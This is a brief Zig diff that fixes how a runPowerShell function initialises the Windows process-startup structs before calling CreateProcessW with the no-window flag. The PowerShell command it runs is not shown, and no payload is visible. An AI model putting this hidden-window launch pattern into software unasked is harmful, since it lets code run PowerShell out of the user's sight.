@@ -114,10 +114,9 @@ fn runPowerShell() bool {
     }
     full_cmd[idx] = 0;
 
-    var si: [68]u8 = undefined;
-    @memset(&si, 0);
-    var pi: [16]u8 = undefined;
-    @memset(&pi, 0);
+    var si = std.mem.zeroes(types.STARTUPINFOW);
+    si.cb = @sizeOf(types.STARTUPINFOW);
+    var pi = std.mem.zeroes(types.PROCESS_INFORMATION);
 
     const ok = CreateProcessWFn(null, full_cmd[0 .. idx + 1 :0], null, null, 0, 0x08000000, null, null, @as(*const anyopaque, @ptrCast(&si)), @as(*anyopaque, @ptrCast(&pi)));
     if (ok != 0) SleepFn(3000);
